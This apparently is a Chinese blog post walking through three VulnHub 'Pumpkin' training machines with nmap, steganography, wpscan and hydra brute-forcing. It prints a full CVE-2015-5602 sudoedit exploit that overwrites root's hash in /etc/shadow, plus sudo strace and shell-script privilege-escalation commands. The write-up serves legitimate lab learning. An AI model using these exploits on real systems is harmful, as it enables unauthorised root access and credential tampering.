@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="靶机渗透,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在vulnhub上找了找靶机玩玩，总体上难度不大，这里记录一下pumpkin这个系列的writeup pumpkin garden这个靶机直接给了ip，所以就不用arp-scan扫了 靶机ip：172.20.10.137 攻击机ip：172.20.10.135 nmap开扫  开放了21，1515，3535端口 先看21端口，有一个匿名访问，得到这个  内容是  Hello Dear!Lookin">
+<meta name="keywords" content="靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pumpkin 1-3 writeup">
+<meta property="og:url" content="http://yoursite.com/2020/02/10/pumpkin/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="在vulnhub上找了找靶机玩玩，总体上难度不大，这里记录一下pumpkin这个系列的writeup pumpkin garden这个靶机直接给了ip，所以就不用arp-scan扫了 靶机ip：172.20.10.137 攻击机ip：172.20.10.135 nmap开扫  开放了21，1515，3535端口 先看21端口，有一个匿名访问，得到这个  内容是  Hello Dear!Lookin">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215152936747.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215153148618.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215153517907.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215153918223.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215154306626.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215154500562.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215154713849.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215154853956.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215155805761.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215160207342.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215161321099.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215161504713.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215164230585.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215164532666.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215164911959.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215170300849.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215170438166.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215171017807.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215171449901.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215171043302.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215171553622.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215172257103.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215172538251.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215172724811.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215173115345.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215173851693.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215174447940.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215174633197.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215175854949.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215181034102.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215181149026.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215181345991.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215190703083.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215191117114.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215192802309.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215193203871.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215193404167.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215193921893.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215194043714.png">
+<meta property="og:updated_time" content="2020-02-15T11:41:27.144Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pumpkin 1-3 writeup">
+<meta name="twitter:description" content="在vulnhub上找了找靶机玩玩，总体上难度不大，这里记录一下pumpkin这个系列的writeup pumpkin garden这个靶机直接给了ip，所以就不用arp-scan扫了 靶机ip：172.20.10.137 攻击机ip：172.20.10.135 nmap开扫  开放了21，1515，3535端口 先看21端口，有一个匿名访问，得到这个  内容是  Hello Dear!Lookin">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/10/pumpkin/image-20200215152936747.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/10/pumpkin/">
+
+
+
+
+
+  <title>pumpkin 1-3 writeup | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/pumpkin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pumpkin 1-3 writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-10T22:07:31+08:00">
+                2020-02-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.5k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在vulnhub上找了找靶机玩玩，总体上难度不大，这里记录一下pumpkin这个系列的writeup</p>
+<h2 id="pumpkin-garden"><a href="#pumpkin-garden" class="headerlink" title="pumpkin garden"></a>pumpkin garden</h2><p>这个靶机直接给了ip，所以就不用arp-scan扫了</p>
+<p>靶机ip：172.20.10.137</p>
+<p>攻击机ip：172.20.10.135</p>
+<p>nmap开扫</p>
+<p><img src="image-20200215152936747.png" alt="image-20200215152936747"></p>
+<p>开放了21，1515，3535端口</p>
+<p>先看21端口，有一个匿名访问，得到这个</p>
+<p><img src="image-20200215153148618.png" alt="image-20200215153148618"></p>
+<p>内容是</p>
+<blockquote>
+<p>Hello Dear!<br>Looking for route map to PumpkinGarden? I think jack can help you find it.</p>
+</blockquote>
+<p>没啥东西，看http服务了，在源码里看到这个</p>
+<p><img src="image-20200215153517907.png" alt="image-20200215153517907"></p>
+<p>去看图片，发现可以直接列目录</p>
+<p><img src="image-20200215153918223.png" alt="image-20200215153918223"></p>
+<p>在hidden_secret下发现了一个clue.txt，base64decode之后得到账号密码</p>
+<blockquote>
+<p>scarecrow : 5Qn@$y</p>
+</blockquote>
+<p>直接ssh登录，成功登录</p>
+<p><img src="image-20200215154306626.png" alt="image-20200215154306626"></p>
+<p>发现有个文件</p>
+<p><img src="image-20200215154500562.png" alt="image-20200215154500562"></p>
+<p>尝试登录goblin的账号，成功登录</p>
+<p><img src="image-20200215154713849.png" alt="image-20200215154713849"></p>
+<p>没有什么可以利用的点，继续信息搜集，在home下找到了这个</p>
+<p><img src="image-20200215154853956.png" alt="image-20200215154853956"></p>
+<p>看样子是要利用这个直接提权了，然而，这网站在我访问的时候是崩的，只能搜了，看一下sudo的版本</p>
+<p><img src="image-20200215155805761.png" alt="image-20200215155805761"></p>
+<p>搜exp找到了这个<a href="https://github.com/t0kx/privesc-CVE-2015-5602" target="_blank" rel="noopener">https://github.com/t0kx/privesc-CVE-2015-5602</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CVE-2015-5602 exploit by t0kx</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/t0kx/privesc-CVE-2015-5602</span></span><br><span class="line"></span><br><span class="line">export EDITOR="/tmp/edit"</span><br><span class="line">export FOLDER="$&#123;RANDOM&#125;"</span><br><span class="line">export PASSWD=$(printf $&#123;RANDOM&#125; \</span><br><span class="line">		| md5sum \</span><br><span class="line">		| awk '&#123;print $1&#125;')</span><br><span class="line"></span><br><span class="line">prepare() &#123;</span><br><span class="line">cat &lt;&lt; EOF &gt;&gt; /tmp/edit</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line">pass="$(printf "%q" $(openssl passwd -1 -salt $&#123;RANDOM&#125; $&#123;PASSWD&#125;))"</span><br><span class="line">sed -i -e  "s,^root:[^:]\+:,root:\$&#123;pass&#125;:," \$&#123;1&#125;</span><br><span class="line">EOF</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main() &#123;</span><br><span class="line">	printf "[+] CVE-2015-5602 exploit by t0kx\n"</span><br><span class="line">	printf "[+] Creating folder...\n"</span><br><span class="line">	mkdir -p /home/$&#123;USER&#125;/$&#123;FOLDER&#125;/</span><br><span class="line">	printf "[+] Creating symlink\n"</span><br><span class="line">	ln -sf /etc/shadow /home/$&#123;USER&#125;/$&#123;FOLDER&#125;/esc.txt</span><br><span class="line">	printf "[+] Modify EDITOR...\n"</span><br><span class="line">	prepare &amp;&amp; chmod +x $&#123;EDITOR&#125;</span><br><span class="line">	printf "[+] Change root password to: $&#123;PASSWD&#125;\n"</span><br><span class="line">	sudoedit /home/$&#123;USER&#125;/$&#123;FOLDER&#125;/esc.txt</span><br><span class="line">	printf "[+] Done\n"</span><br><span class="line">&#125;; main</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机上准备好脚本，开simpleHttp，在靶机上直接wget就好了</p>
+<p>攻击机上开启SimpleHttpServer</p>
+<p><img src="image-20200215160207342.png" alt="image-20200215160207342"></p>
+<p>靶机下载并提权，中间有一步改root密码，直接把goblin的hash复制到root那里就好了</p>
+<p><img src="image-20200215161321099.png" alt="image-20200215161321099"></p>
+<p>可以看到已经是root用户了，最后一步就是看flag了</p>
+<p><img src="image-20200215161504713.png" alt="image-20200215161504713"></p>
+<h2 id="pumpkin-raising"><a href="#pumpkin-raising" class="headerlink" title="pumpkin raising"></a>pumpkin raising</h2><p>靶机ip：172.20.10.138</p>
+<p>攻击机ip：172.20.10.135</p>
+<p>靶机一共有4个pumpkin seeds，一个root flag</p>
+<p>nmap开扫</p>
+<p><img src="image-20200215164230585.png" alt="image-20200215164230585"></p>
+<p>开放了22，80端口，直接看web服务，源码有一行</p>
+<p><img src="image-20200215164532666.png" alt="image-20200215164532666"></p>
+<p>解出来是这个，没什么用</p>
+<blockquote>
+<p>This is just to remaind you that it’s Level 2 of Mission-Pumpkin! ;)</p>
+</blockquote>
+<p>扫目录扫到了robots.txt</p>
+<p><img src="image-20200215164911959.png" alt="image-20200215164911959"></p>
+<p>然后进去随便翻翻，在hidden/note.txt里找到了这个</p>
+<blockquote>
+<p>Robert : C@43r0VqG2=<br>Mark : Qn@F5zMg4T<br>goblin : 79675-06172-65206-17765</p>
+</blockquote>
+<p>尝试ssh登录，失败</p>
+<p>继续翻，找到了/seeds/seed.txt.gpg，但是没有密码，无法解密，尝试用首页上的SEEDWATERSUNLIGHT来解密，成功</p>
+<p><img src="image-20200215170300849.png" alt="image-20200215170300849"></p>
+<p>在后边应该是一串莫斯电码，找个网站直接解密看看，成功解密</p>
+<p><img src="image-20200215170438166.png" alt="image-20200215170438166"></p>
+<p>得到第一个pumpkin seed</p>
+<blockquote>
+<p>YIPPEEYOAROTHRIGHPATH..BIGMAXPUMPKIEEDID69507</p>
+</blockquote>
+<p>然后继续翻，找到了pumpkin.html，里边有一串</p>
+<p><img src="image-20200215171017807.png" alt="image-20200215171017807"></p>
+<p>一看就是base家族的，最后试出来是base32，得到</p>
+<blockquote>
+<p>/scripts/spy.pcap</p>
+</blockquote>
+<p>下载一下，wireshark打开，follow一下tcp流，得到第二个seed</p>
+<p><img src="image-20200215171449901.png" alt="image-20200215171449901"></p>
+<p>之前的pumpkin.html还有一些16进制数据</p>
+<p><img src="image-20200215171043302.png" alt="image-20200215171043302"></p>
+<p>找个<a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener">网站</a>解一下，得到第三个seed</p>
+<p><img src="image-20200215171553622.png" alt="image-20200215171553622"></p>
+<p>继续找，找到了underconstruction.html，在源码里看到这个</p>
+<p><img src="image-20200215172257103.png" alt="image-20200215172257103"></p>
+<p>可以看到应该是个图片隐写，找到了images/jackolantern.gif，开搞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegosuite -x jackolantern.gif</span><br></pre></td></tr></table></figure>
+
+<p>发现有密码</p>
+<p><img src="image-20200215172538251.png" alt="image-20200215172538251"></p>
+<p>之前的三个账号密码还没试，试一下，试出来了密码是 Qn@F5zMg4T，得到了第四个seed</p>
+<p><img src="image-20200215172724811.png" alt="image-20200215172724811"></p>
+<p>四个seed为69507，96454，50609，86568，然后就是排列组合登录jack账号了，尝试得到密码为69507506099645486568，ssh成功登录jack</p>
+<p><img src="image-20200215173115345.png" alt="image-20200215173115345"></p>
+<p>但是这是个rbash，也就是受限制的shell，可以用这个命令来在ssh连接的时候得到不受限的shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jack@172.20.10.138 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到一切正常了</p>
+<p><img src="image-20200215173851693.png" alt="image-20200215173851693"></p>
+<p>然后就是准备提权了</p>
+<p><img src="image-20200215174447940.png" alt="image-20200215174447940"></p>
+<p>在这个<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">神奇的网站</a>上搜一下，用这个命令就可以提权了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -o /dev/null /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="image-20200215174633197.png" alt="image-20200215174633197"></p>
+<p>总之这个靶机以取证隐写为主，和ctf的misc很像</p>
+<h2 id="pumpkin-festival"><a href="#pumpkin-festival" class="headerlink" title="pumpkin festival"></a>pumpkin festival</h2><p>靶机ip：172.20.10.139</p>
+<p>攻击机ip：172.20.10.135</p>
+<p>这个靶机有几个token，一个root flag</p>
+<p>照样nmap开路</p>
+<p><img src="image-20200215175854949.png" alt="image-20200215175854949"></p>
+<p>开放了21，80，6880端口</p>
+<p>和第一个靶机一样，直接登录看文件，得到token1</p>
+<blockquote>
+<p>PumpkinToken : 2d6dbbae84d724409606eddd9dd71265</p>
+</blockquote>
+<p>然后看web服务，看源码，得到token2</p>
+<blockquote>
+<p>PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52</p>
+</blockquote>
+<p>扫目录，得到robots.txt，两个403，一个404，还有一个store/track.txt，访问得到了这个</p>
+<blockquote>
+<p>Hey Jack!</p>
+<p>Thanks for choosing our local store. Hope you like the services.<br>Tracking code : 2542 8231 6783 486</p>
+<p>-Regards<br><a href="mailto:admin@pumpkins.local" target="_blank" rel="noopener">admin@pumpkins.local</a></p>
+</blockquote>
+<p>这里给了域名pumpkins.local，尝试改一下hosts</p>
+<p><img src="image-20200215181034102.png" alt="image-20200215181034102"></p>
+<p>这样就可以访问了</p>
+<p><img src="image-20200215181149026.png" alt="image-20200215181149026"></p>
+<p>得到token3</p>
+<blockquote>
+<p>PumpkinToken : 06c3eb12ef2389e2752335beccfb2080</p>
+</blockquote>
+<p>wpscan开始扫</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url 172.20.10.139 -e u</span><br></pre></td></tr></table></figure>
+
+<p>得到两个用户</p>
+<p><img src="image-20200215181345991.png" alt="image-20200215181345991"></p>
+<p>还有readme.html，访问得到一串K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s，base家族试一波，base62，解得两个用户的密码</p>
+<blockquote>
+<p>morse &amp; jack : Ug0t!TrIpyJ</p>
+</blockquote>
+<p>尝试登录，morse账号成功登录，在profile得到token4</p>
+<blockquote>
+<p>PumpkinToken : 7139e925fd43618653e51f820bc6201b</p>
+</blockquote>
+<p>然后尝试登录admin，这里卡了很久，后来看了wp，把整站的单词爬下来，生成字典来爆破，得到密码为Alohomora!</p>
+<p>在post里找到了token5</p>
+<blockquote>
+<p>PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4</p>
+</blockquote>
+<p>在setting里找到了token6</p>
+<blockquote>
+<p>PumpkinToken : 06c3eb12ef2389e2752335beccfb2080</p>
+</blockquote>
+<p>之后又陷入了停滞，看了wp，去搞ftp，用户为web服务index里提到的harry，使用hydra爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l harry -e nsr -P /usr/share/wordlists/rockyou.txt ftp://172.20.10.139</span><br></pre></td></tr></table></figure>
+
+<p>得到密码yrrah</p>
+<p><img src="image-20200215190703083.png" alt="image-20200215190703083"></p>
+<p>ftp连接</p>
+<p><img src="image-20200215191117114.png" alt="image-20200215191117114"></p>
+<p>进去发现Donotopen，一路进去，找到了token.txt和data.txt，得到token7</p>
+<blockquote>
+<p>PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c</p>
+</blockquote>
+<p>用file命令来看一下data.txt，是个压缩文件，一路解压得到了jack，里边是十六进制，找网站解一下，是一个ssh key</p>
+<p><img src="image-20200215192802309.png" alt="image-20200215192802309"></p>
+<p>改个600权限直接登录就好了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jack@172.20.10.139 -p6880 -i jack</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20200215193203871.png" alt="image-20200215193203871"></p>
+<p>然后就是提权，sudo要密码，尝试之前得到的密码，成功</p>
+<p><img src="image-20200215193404167.png" alt="image-20200215193404167"></p>
+<p>看到允许pumpkins/alohomora*，所以可以自建一个文件，命名为alohomora，内容是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以开启一个root权限的shell，至于写入，可以用echo命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;#!/bin/bash&apos; &gt; alohomora</span><br><span class="line">echo &apos;/bin/sh&apos; &gt;&gt; alohomora</span><br></pre></td></tr></table></figure>
+
+<p>然后chmod +x alohomora，再sudo ./alohomora就可以成功getshell了</p>
+<p><img src="image-20200215193921893.png" alt="image-20200215193921893"></p>
+<p>最后看一下flag就好了</p>
+<p><img src="image-20200215194043714.png" alt="image-20200215194043714"></p>
+<p>参考：<a href="https://mzfr.github.io/vulnhub-writeups/2019-07-22-PumpkinFestival" target="_blank" rel="noopener">https://mzfr.github.io/vulnhub-writeups/2019-07-22-PumpkinFestival</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机渗透/" rel="tag"># 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/07/thinkphp-5-0-24-unserialize/" rel="next" title="thinkphp 5.0.24 反序列化漏洞分析">
+                <i class="fa fa-chevron-left"></i> thinkphp 5.0.24 反序列化漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/11/hgame-2020-sekiro/" rel="prev" title="hgame2020 sekiro writeup">
+                hgame2020 sekiro writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pumpkin-garden"><span class="nav-number">1.</span> <span class="nav-text">pumpkin garden</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pumpkin-raising"><span class="nav-number">2.</span> <span class="nav-text">pumpkin raising</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pumpkin-festival"><span class="nav-number">3.</span> <span class="nav-text">pumpkin festival</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
